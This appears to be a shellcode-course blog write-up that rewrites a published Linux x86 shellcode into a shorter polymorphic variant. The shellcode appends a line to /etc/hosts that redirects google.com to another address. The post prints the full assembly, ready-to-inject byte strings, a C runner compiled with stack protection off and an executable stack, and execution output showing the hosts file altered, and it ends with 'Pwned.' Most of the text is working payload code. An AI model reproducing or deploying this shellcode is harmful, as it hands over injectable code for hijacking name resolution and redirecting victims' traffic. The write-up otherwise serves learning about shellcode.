# Modify Hosts File

<p style="text-align: justify;">Address of the original shellcode:</p>
- [http://shell-storm.org/shellcode/files/shellcode-893.php](http://shell-storm.org/shellcode/files/shellcode-893.php)

Original source code:
```nasm
/**

;modify_hosts.asm
;this program add a new entry in hosts file pointing google.com to 127.1.1.1 
;author Javier Tejedor
;date 24/09/2014

global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80        ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20         ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80        ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80        ;syscall to close the file

    push 0x1
    pop eax
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
**/
i
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```
<p style="text-align: justify;">I will try to present my polymorphic shellcode in parts (and finally the whole) in order to explain in detail the changes and improvements I have made.</p>

### Clearing 

Original code:
```nasm
  xor ecx, ecx
  mul ecx
```
Code after changes:
```nasm
  push ecx
  pop eax
```
<p style="text-align: justify;">After analysis in GDB, it turned out that only the EAX register is required to be reset (other registers already contain zeros). We can therefore replace two double-byte lines of code with two single-byte ones, thus saving two bytes.
</p>

### sys_open()
 
```nasm
  mov al, 0x5     
  push ecx
  push 0x7374736f     ;/etc///hosts
  push 0x682f2f2f
  push 0x6374652f
  mov ebx, esp
  mov cx, 0x401       ;permmisions
  int 0x80            ;syscall to open file
```
Code after changes:
```nasm
  add al, 5
  push ecx
  jmp short _second

_hosts:
  pop ebx
  mov cx, 0x401
  int 0x80

[..]

_second:
  call _hosts
  host db "/etc/hosts"
```
<p style="text-align: justify;">The opening of the file has been thoroughly rebuilt. As you can see, I used the JMP-CALL-POP technique to load the "/ etc / hosts" value on top of the stack and then put it in EBX with the "pop ebx" instruction. The method of placing the value 5 in EAX has also been changed (from MOV to ADD).
</p>
 
### sys_write()
 
Original code:
```nasm
  xchg eax, ebx
  push 0x4
  pop eax
  jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
  pop ecx
  push 20                 ;length of the string, dont forget to modify if changes the map
  pop edx
  int 0x80                ;syscall to write in the file
  
[..]
  
_load_data:
  call _write
  google db "127.1.1.1 google.com"
```
Code after changes:
```nasm
  mov ebx, eax
  push 0x4
  pop eax
  jmp short _load_data

_write:
  pop ecx
  mov dl, len
  int 0x80        ;syscall to write in the file

[..]

_load_data:
  call _write
  google db "127.1.1.1 google.com"
  len equ $-google
```
<p style="text-align: justify;">At the beginning, I changed a very optimal solution using the XCHG instruction to a simpler MOV. Then, the JMP-CALL-POP technique is called. As you probably remember, I used it once in this code, so the second use should be impossible. At the time of the CALL statement, the value you want to add to the file is thrown onto the stack, as well as the next lines of code, i.e. previously used string "/etc/hosts". However, the argument that we put in the EDX register comes in handy, which is the length of the string we want to put in the write () function. With its help, we can "cut" the long string only to the amount that interests us. To this end, I used the nasm language function - length (), assigning it to the variable "len".
</p>

### sys_close()

Original code:
```nasm
  push 0x6
  pop eax
  int 0x80        ;syscall to close the file
```

<p style="text-align: justify;">After analysis and tests, despite the fact that this is not very elegant behavior, you can completely skip sys_close() system call, because the file is already overwritten (goal achieved). It remains therefore only to close the program - sys_exit().
</p>

### sys_exit()

<p style="text-align: justify;">These lines of code remained unchanged.</p>

### Full code after changes

```nasm
global _start

section .text

_start:
  push ecx                ; Pushes 0
  pop eax                 ; Moving 0 to EAX 
  add al, 5               ; Moving 5 to EAX (for sys_open())
  push ecx                ; Pushing 0 on the stack (string terminator for next lines of code)
  jmp short _second       ; JMP-CALL-POP

_hosts:
  pop ebx                 ; Moving "/etc/hosts" string to EBX
  mov cx, 0x401           ; Setting permissions - /etc/hosts can be modified only by user like root
  int 0x80                ; Syscall execution
  
  mov ebx, eax            ; Moving syscall return value (7) to EBX
  push 0x4                ; Pushing 4 on the stack
  pop eax                 ; Moving value 4 to EAX
  jmp short _load_data    ; JMP-CALL-POP #2

_write:
  pop ecx                 ; Moving "127.1.1.1 google.com" to ECX
  mov dl, len             ; Moving length of above string to EDX
  int 0x80                ; Syscall execution

  push 1                  ; Pushes 1 on stack
  pop eax                 ; Moving 1 to EAX
  int 0x80                ; Syscall execution

_load_data:
  call _write             ; JMP to _write section
  google db "127.1.1.1 google.com"
  len equ $-google

_second:
  call _hosts             ; JMP to _hosts section
  host db "/etc/hosts"
```

### Compiling and Execution

```sh
$ ./compile.sh modify-hosts
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
"\x51\x58\x04\x05\x51\xeb\x31\x5b\x66\xb9\x01\x04\xcd\x80\x89\xc3\x6a\x04\x58\xeb\x0a\x59\xb2\x14\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xf1\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\xe8\xca\xff\xff\xff\x2f\x65\x74\x63\x2f\x68\x6f\x73\x74\x73"
```
<p style="text-align: justify;">Shellcode.c wrapper file content:</p>

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x51\x58\x04\x05\x51\xeb\x31\x5b\x66\xb9\x01\x04\xcd\x80\x89\xc3\x6a\x04\x58\xeb\x0a\x59\xb2\x14\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xf1\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\xe8\xca\xff\xff\xff\x2f\x65\x74\x63\x2f\x68\x6f\x73\x74\x73";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
Execution:
```sh
$  cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	ubuntu
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode

Shellcode Length:  71

$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	ubuntu
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.1.1.1 google.com            <---------
```

### Summary

Original shellcode length:

- **77 bytes**

Length of polymorphic shellcode:

- **71 bytes**

Difference in length:

- **~8% shorter!**

### Pwned.
